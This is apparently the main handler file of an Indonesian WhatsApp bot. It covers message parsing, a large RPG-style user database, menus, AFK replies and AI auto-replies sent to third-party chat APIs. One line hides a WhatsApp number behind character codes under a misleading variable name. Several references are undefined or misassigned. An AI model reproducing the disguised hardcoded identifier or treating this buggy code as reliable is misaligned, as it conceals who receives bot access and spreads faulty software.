require('./config');
const { description, version, name, main } = require("./package.json")
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const nou = require('node-os-utils');
const cheerio = require('cheerio');
const crypto = require('crypto');
const yts = require('yt-search');
const ms = toMs = require('ms')
const ffmpeg = require('fluent-ffmpeg');
const ffmpegStatic = require('ffmpeg-static');
const ytdl = require('@vreden/youtube_scraper');
const { GoogleGenerativeAI } = require("@google/generative-ai")
const genshindb = require("genshin-db")
const jsobfus = require("javascript-obfuscator")
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { tiktokSearchVideo } = require('./lib/scraper');
const owner = JSON.parse(fs.readFileSync("./lib/database/owner.json"))
const Case = require("./lib/system");
const setting = JSON.parse(fs.readFileSync('./setdb.json'));
const {
	UploadFileUgu
} = require('./lib/uploaderr')
const { CatBox, TelegraPh, floNime, uptotelegra } = require('./lib/uploader');
const contacts = JSON.parse(fs.readFileSync("./lib/database/contacts.json"))
let afk = require("./lib/afk");
let _afk = JSON.parse(fs.readFileSync('./lib/database/user.json'))
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    spawn, 
    exec,
    webp2mp4File,
    execSync 
   } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ResockectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediasockInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DissockectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function.js');






const databasefile = './lib/database.json';
function loaddatabase() {
  if (fs.existsSync(databasefile)) {
    try {
      const raw = fs.readFileSync(databasefile);
      return JSON.parse(raw);
    } catch (err) {
      console.error('Error reading DB file:', err);
      return {
        chats: {}
      };
    }
  } else {
    return {
      chats: {}
    };
  }
}

function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
global.db = loaddatabase();
if (global.db) global.db = {
  sticker: {},
  database: {},
  game: {},
  others: {},
  users: {},
  chats: {},
  settings: {},
  ...(global.db || {})
}


module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? sock.user.id.split(":")[0] + "@s.whatsapp.net" || sock.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : `.`;
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const isPrivate = from.endsWith("@s.whatsapp.net");
        
        const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
        const botNumber = await sock.decodeJid(sock.user.id);
        const isOwner = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const cmd = prefix + command
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const sockdev = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isPremium = premium.includes(m.sender)
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)

        const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                lid: p.lid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        const senderLid = (() => {
            const p = participants.find(p => p.jid === m.sender);
            return p?.lid || null;
        })();
        
        
const qkontak = {
key: {
participant: `13135550002@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
//
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize,
            randomKarakter
            } = require('./lib/myfunction');
            
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${senderNumber}`
                )
            );
            
            if (isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   ⌬ Grup: ${groupName} \n` +
                        `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
        const reaction = async (jidss, emoji) => {
            sock.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}
// Message
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var Waktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var Waktu = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var Waktu = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var Waktu = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var Waktu = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var Waktu = `Selamat Pagi 🌄`
 } 
 
 
     try {
      const isNumber = x => typeof x === 'number' && !isNaN(x)
      const user = global.db.users[m.sender]
      if (typeof user !== 'object') global.db.users[m.sender] = {}
      const chats = global.db.chats[m.chat]
      if (typeof chats !== 'object') global.db.chats[m.chat] = {}

      if (chats) {
        if (!('antitagsw' in chats)) chats.antitagsw = false
        if (!('autoyoimiya' in chats)) chats.autoyoimiya = false
        if (!('antipromosi' in chats)) chats.antipromosi = false
        if (!('owneronly' in chats)) chats.owneronly = false
      } else global.db.chats[m.chat] = {
        owneronly: false,
        antitagsw: false,
        autoyoimiya: false,
        antipromosi: false
      }

      if (user) {
        if (!isNumber(user.subscribers)) user.subscribers = 0
        if (!isNumber(user.like)) user.like = 0
        if (!isNumber(user.viewers)) user.viewers = 0
        if (!isNumber(user.playButton)) user.playButton = 0
        if (!isNumber(user.lastLive)) user.lastLive = 0
        if (!isNumber(user.chip)) user.chip = 0
        if (!isNumber(user.level)) user.level = 0
        if (!isNumber(user.atm)) user.atm = 0
        if (!isNumber(user.money)) user.money = 0
        if (!isNumber(user.fullatm)) user.fullatm = 0
        if (!isNumber(user.bank)) user.bank = 0
        if (!isNumber(user.health)) user.health = 100
        if (!isNumber(user.potion)) user.potion = 0
        if (!isNumber(user.trash)) user.trash = 0
        if (!isNumber(user.wood)) user.wood = 0
        if (!isNumber(user.rock)) user.rock = 0
        if (!isNumber(user.string)) user.string = 0
        if (!isNumber(user.petfood)) user.petfood = 0
        if (!isNumber(user.emerald)) user.emerald = 0
        if (!isNumber(user.diamond)) user.diamond = 0
        if (!isNumber(user.gold)) user.gold = 0
        if (!isNumber(user.botol)) user.botol = 0
        if (!isNumber(user.kardus)) user.kardus = 0
        if (!isNumber(user.kaleng)) user.kaleng = 0
        if (!isNumber(user.gelas)) user.gelas = 0
        if (!isNumber(user.plastik)) user.plastik = 0
        if (!isNumber(user.iron)) user.iron = 0
        if (!isNumber(user.common)) user.common = 0
        if (!isNumber(user.uncommon)) user.uncommon = 0
        if (!isNumber(user.mythic)) user.mythic = 0
        if (!isNumber(user.legendary)) user.legendary = 0
        if (!isNumber(user.umpan)) user.umpan = 0
        if (!isNumber(user.pet)) user.pet = 0
        if (!isNumber(user.paus)) user.paus = 0
        if (!isNumber(user.kepiting)) user.kepiting = 0
        if (!isNumber(user.gurita)) user.gurita = 0
        if (!isNumber(user.cumi)) user.cumi = 0
        if (!isNumber(user.buntal)) user.buntal = 0
        if (!isNumber(user.dory)) user.dory = 0
        if (!isNumber(user.lumba)) user.lumba = 0
        if (!isNumber(user.lobster)) user.lobster = 0
        if (!isNumber(user.hiu)) user.hiu = 0
        if (!isNumber(user.udang)) user.udang = 0
        if (!isNumber(user.orca)) user.orca = 0
        if (!isNumber(user.banteng)) user.banteng = 0
        if (!isNumber(user.gajah)) user.gajah = 0
        if (!isNumber(user.harimau)) user.harimau = 0
        if (!isNumber(user.kambing)) user.kambing = 0
        if (!isNumber(user.panda)) user.panda = 0
        if (!isNumber(user.buaya)) user.buaya = 0
        if (!isNumber(user.kerbau)) user.kerbau = 0
        if (!isNumber(user.sapi)) user.sapi = 0
        if (!isNumber(user.monyet)) user.monyet = 0
        if (!isNumber(user.babihutan)) user.babihutan = 0
        if (!isNumber(user.babi)) user.babi = 0
        if (!isNumber(user.ayam)) user.ayam = 0

        if (!isNumber(user.lastadventure)) user.lastadventure = 0
        if (!isNumber(user.lastkill)) user.lastkill = 0
        if (!isNumber(user.lastmisi)) user.lastmisi = 0
        if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
        if (!isNumber(user.lastwar)) user.lastwar = 0
        if (!isNumber(user.lastsda)) user.lastsda = 0
        if (!isNumber(user.lastduel)) user.lastduel = 0
        if (!isNumber(user.lastmining)) user.lastmining = 0
        if (!isNumber(user.lasthunt)) user.lasthunt = 0
        if (!isNumber(user.lastgift)) user.lastgift = 0
        if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
        if (!isNumber(user.lastdagang)) user.lastdagang = 0
        if (!isNumber(user.lasthourly)) user.lasthourly = 0
        if (!isNumber(user.lastbansos)) user.lastbansos = 0
        if (!isNumber(user.lastrampok)) user.lastrampok = 0
        if (!isNumber(user.lastclaim)) user.lastclaim = 0
        if (!isNumber(user.lastnebang)) user.lastnebang = 0
        if (!isNumber(user.lastweekly)) user.lastweekly = 0
        if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
        if (!isNumber(user.apel)) user.apel = 0
        if (!isNumber(user.anggur)) user.anggur = 0
        if (!isNumber(user.jeruk)) user.jeruk = 0
        if (!isNumber(user.mangga)) user.mangga = 0
        if (!isNumber(user.pisang)) user.pisang = 0
        if (!isNumber(user.makanan)) user.makanan = 0
        if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
        if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
        if (!isNumber(user.bibitapel)) user.bibitapel = 0
        if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
        if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
        if (!isNumber(user.horse)) user.horse = 0
        if (!isNumber(user.horseexp)) user.horseexp = 0
        if (!isNumber(user.cat)) user.cat = 0
        if (!isNumber(user.catexp)) user.catexp = 0
        if (!isNumber(user.fox)) user.fox = 0
        if (!isNumber(user.foxhexp)) user.foxexp = 0
        if (!isNumber(user.dog)) user.foxexp = 0
        if (!isNumber(user.dogexp)) user.dogexp = 0
        if (!isNumber(user.robo)) user.robo = 0
        if (!isNumber(user.roboexp)) user.roboexp = 0
        if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
        if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
        if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
        if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
        if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
        if (!isNumber(user.robo)) user.robo = 0
        if (!isNumber(user.robodurability)) user.robodurability = 0
        if (!isNumber(user.armor)) user.armor = 0
        if (!isNumber(user.armordurability)) user.armordurability = 0
        if (!isNumber(user.sword)) user.sword = 0
        if (!isNumber(user.sworddurability)) user.sworddurability = 0
        if (!isNumber(user.pickaxe)) user.pickaxe = 1
        if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
        if (!isNumber(user.exp)) user.exp = 0
        if (!isNumber(user.rank)) user.rank = 0
        if (!isNumber(user.fishingrod)) user.fishingrod = 0
        if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
        if (!user.premium) user.premiumTime = 0
        if (!('afkReason' in user)) user.afkReason = ''
        if (!("premium" in user)) user.premium = false
        if (!('autoMikasa' in user)) user.autoMikasa = false
        if (!('autoaiset' in user)) user.autoaiset = false
        if (!('caiSesi' in user)) user.caiSesi = ''
        if (!('nama' in user)) user.nama = `${pushname}`;
      } else global.db.users[m.sender] = {
        subscribers: 0,
        like: 0,
        viewers: 0,
        youtube: `${pushname}`,
        playButton: 0,
        lastLive: 0,
        afkTime: -1,
        afkReason: '',
        premiumTime: 0,
        premium: false,
        money: 100000,
        exp: 0,
        rank: 0,
        autoMikasa: false,
        autoaiset: false,
        caiSesi: '',
        level: 0,
        rankup: 0,
        limit: 20,
        freelimit: 0,
        nama: `${pushname}`,
        lastclaim: 0,
        skata: 0,
        registered: false,
        name: m.name,
        pc: 0,
        joinlimit: 1,
        age: -1,
        regTime: -1,
        unreg: false,
        afk: -1,
        afkReason: '',
        banned: false,
        bannedTime: 0,
        warning: 0,
        rokets: 0,
        role: 'Beginner',
        skill: '',
        ojekk: 0,
        WarnReason: '',
        chip: 0,
        bank: 0,
        atm: 0,
        fullatm: 0,
        health: 1000,
        potion: 10,
        trash: 0,
        wood: 0,
        rock: 0,
        string: 0,
        emerald: 0,
        diamond: 0,
        gold: 0,
        iron: 0,
        common: 0,
        uncommon: 0,
        mythic: 0,
        legendary: 0,
        umpan: 0,
        pet: 0,
        horse: 0,
        horseexp: 0,
        horselastfeed: 0,
        cat: 0,
        catexp: 0,
        catlastfeed: 0,
        fox: 0,
        foxexp: 0,
        foxlastfeed: 0,
        robo: 0,
        roboexp: 0,
        robolastfeed: 0,
        dog: 0,
        dogexp: 0,
        doglastfeed: 0,
        paus: 0,
        kepiting: 0,
        gurita: 0,
        cumi: 0,
        buntal: 0,
        dory: 0,
        lumba: 0,
        lobster: 0,
        hiu: 0,
        udang: 0,
        ikan: 0,
        orca: 0,
        banteng: 0,
        harimau: 0,
        gajah: 0,
        kambing: 0,
        buaya: 0,
        kerbau: 0,
        sapi: 0,
        monyet: 0,
        babi: 0,
        ayam: 0,
        armor: 1,
        armordurability: 0,
        sword: 1,
        sworddurability: 0,
        pickaxe: 1,
        pickaxedurability: 0,
        fishingrod: 0,
        fishingroddurability: 0,
        robo: 0,
        robodurability: 0,
        apel: 20,
        pisang: 0,
        anggur: 0,
        mangga: 0,
        jeruk: 0,
        lastadventure: 0,
        lastkill: 0,
        lastmisi: 0,
        lastdungeon: 0,
        lastwar: 0,
        lastsda: 0,
        lastduel: 0,
        lastmining: 0,
        lasthunt: 0,
        lastgift: 0,
        lastberkebon: 0,
        lastdagang: 0,
        lasthourly: 0,
        lastbansos: 0,
        lastrampok: 0,
        lastclaim: 0,
        lastnebang: 0,
        lastweekly: 0,
        lastmonthly: 0

      }

      // Inisialisasi file database untuk Auto AI v2

      const setting = db.settings[botNumber]
      if (typeof setting !== 'object') db.settings[botNumber] = {}
      if (setting) {
        if (!('anticall' in setting)) setting.anticall = false
        if (!isNumber(setting.status)) setting.status = 0
        if (!('autobio' in setting)) setting.autobio = false
        if (!('autopromosi' in setting)) setting.autopromosi = false
        if (!('autoread' in setting)) setting.autoread = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlyadmin' in setting)) setting.onlyadmin = false
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
      } else global.db.settings[botNumber] = {
        anticall: false,
        status: 0,
        stock: 10,
        autobio: false,
        autopromosi: false,
        autoread: false,
        auto_ai_grup: false,
        goodbye: false,
        onlyadmin: false,
        onlygrub: false,
        onlypc: false,
        welcome: false,
        autoread: false
      }

    } catch (err) {
      console.error(err)
    }
 
 
 
const menu = (teks) => {
let start = performance.now();
					let end = performance.now();
					let latensi = end - start;
sock.sendMessage(m.chat, {
    interactiveMessage: {
      title: `
      👋Hai kak *${pushname}* Selamat *${Waktu}*
      
*\`⧽──𓊈 INFO USER 𓊉──⧼\`*
👤Nama : ${pushname}
📳Nomor : ${senderNumber}
👑Role : ${isOwner ? 'Owner' : isPremium ? 'VIP' : 'Free'}

*\`⧽──𓊈 INFO BOT 𓊉──⧼\`*
🤖Nama-Bot : ${namaBot}
⏱️Runtime : ${runtime(process.uptime())}
🌗Mode : ${sock.public ? "Public" : "Self"}
💡Fitur : ${totalfitur}
👾Version : ${version}

*\`⧽──𓊈 INFO SCRIPT 𓊉──⧼\`*
Name : ${name}
Baileys : ${description}
Version : ${version}
Main  : ${main}

Kecepatan-Respon : ${latensi.toFixed(4)} second
${teks}
`,
      footer: "© "+namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "© "+namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "select menu",
            button_title: "select menu"
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "select menu",
              sections: [
                {
                  title: "",
                  highlight_label: "Semua Menu",
                  rows: [
                    {
                      title: "Semua Menu",
                      description: "© "+namaBot,
                      id: ".allmenu"
                      },
                      {
                      title: "Owner Menu",
                      description: "© "+namaBot,
                      id: ".menuowner"
                      },
                      {
                      title: "Group Menu",
                      description: "© "+namaBot,
                      id: ".menugroup"
                      },
                      {
                      title: "Other Menu",
                      description: "© "+namaBot,
                      id: ".menuother"
                      },
                      {
                      title: "Ai Menu",
                      description: "© "+namaBot,
                      id: ".menuai"
                      },
                      {
                      title: "Download Menu",
                      description: "© "+namaBot,
                      id: ".menudownload"
                      },
                      {
                      title: "Convert Menu",
                      description: "© "+namaBot,
                      id: ".menuconvert"
                      },
                      {
                      title: "Cpanel Menu",
                      description: "© "+namaBot,
                      id: ".menucpanel"
                      },
                      {
                      title: "Cpanel2 Menu",
                      description: "© "+namaBot,
                      id: ".menucpanel2"
                      },
                      {
                      title: "Fun Menu",
                      description: "© "+namaBot,
                      id: ".menufun"
                      },
                      {
                      title: "Anime Menu",
                      description: "© "+namaBot,
                      id: ".menuanime"
                      },
                      {
                      title: "Game Menu",
                      description: "© "+namaBot,
                      id: ".menugame"
                      },
                      {
                      title: "Primbon Menu",
                      description: "© "+namaBot,
                      id: ".menuprimbon"
                      },
                      {
                      title: "Maker Menu",
                      description: "© "+namaBot,
                      id: ".menumaker"
                    }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
          name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "My Channel",
          url: linkch,
          merchant_url: linkch
            })
          }
        ]
      }
    }
  },
  { quoted: m })
  }
  
const reply = (teks) => {
sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: "120363423889841112@g.us" }, forwardedNewsletterMessageInfo: { newsletterName: `${namaBot}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: "© "+namaBot, 
body: `version ${version}`, 
thumbnailUrl: thumbnail2, 
sourceUrl: null, 
}}}, {quoted: m })
}

// Function
if (!isOwner && setting.onlyadmin && !isAdmins && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return sock.sendMessage(m.chat, {
              text: "Bot hanya bisa di gunakan untuk admin group"
            }, {
              quoted: m
            })
            
            if (!isOwner && setting.onlygc && !m.isGroup && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return sock.sendMessage(m.chat, {image: {url: thumbnail }, caption: `Bot hanya dapat digunakan di dalam grup` }, {quoted: m})
            
            if (!isOwner && setting.onlypm && !isPrivate && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return sock.sendMessage(m.chat, {
              text: "Bot hanya bisa di gunakan di private chat"
            }, {
              quoted: m
            })
            if (setting.autotyping) {
if (command) { sock.readMessages([m.key])}
sock.sendPresenceUpdate('composing', from)
}
if (setting.autoread) {
sock.readMessages([m.key])
        };
        if (setting.autobio) {
			sock.updateProfileStatus(`${namaBot} Telah Berjalan Selama ${runtime(process.uptime())}`).catch(_ => _);
		}
		async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./Lyrra.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./Lyrra.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }
 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return 
console.log("!")
}
}
const totalfitur = await totalfiturr()
async function React() {
      sock.sendMessage(from, {
        react: {
          text: "🕑",
          key: m.key
        }
      })
    }
    //
    if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]

    for (let ment of mentionUser) {
        if (afk.checkAfkUser(ment, _afk)) {
            let getId2 = afk.getAfkId(ment, _afk)
            let getReason2 = afk.getAfkReason(getId2, _afk)
            let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
            let durasi = ms(getTimee)

            if (isCreator) {
                sock.sendMessage(m.chat, {text:`Woeee @${ment.split('@')[0]} balek woee, lu di cariin ${pushname} senpai`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  
            } else {
                reply(`Jangan tag dia, dia lagi ${getReason2} sejak ${durasi} yg lalu`)
            }
        }
    }

    if (afk.checkAfkUser(m.sender, _afk)) {
        let getId = afk.getAfkId(m.sender, _afk)
        let getReason = afk.getAfkReason(getId, _afk)
        let getTime = Date.now() - afk.getAfkTime(getId, _afk)
        let durasi = ms(getTime)

        _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
        fs.writeFileSync('./lib/database/user.json', JSON.stringify(_afk))

        sock.sendTextWithMentions(
            m.chat,
            `@${m.sender.split('@')[0]} telah kembali dari afk\nReason: ${getReason}\nDurasi: ${durasi}`,
            m
        )
    }
}
async function Lyrra(pushname, text) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,
            "tokenLimit": 8000,
            "completionTokenLimit": 5000,
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": "Kamu Adalah Ai Pintar memakai bahasa netral nama kamu adalah Lyrra Ai", 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    reply(result)
}
if (setting.autoaigc && !m.key.fromMe && !isCmd) {
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      loadai(`${data.result}`);
    } else {
      Lyrra(pushname, text);
  }
} catch (e) {
  reply('Terjadi error, coba lagi nanti.');
}

}
async function tiktokSearchVideo(query) {
	return new Promise(async (resolve, reject) => {
		axios("https://tikwm.com/api/feed/search", {
			headers: {
				"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				cookie: "current_language=en",
				"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
			},
			data: {
				keywords: query,
				count: 12,
				cursor: 0,
				web: 1,
				hd: 1,
			},
			method: "POST",
		}).then((res) => {
			resolve(res.data.data);
		});
	});
}
global.autoshalat = true
sock.enhancer = sock.enhancer ? sock.enhancer : {};
        
sock.autoshalat = sock.autoshalat ? sock.autoshalat : {}
    let id = m.chat
    if (id in sock.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
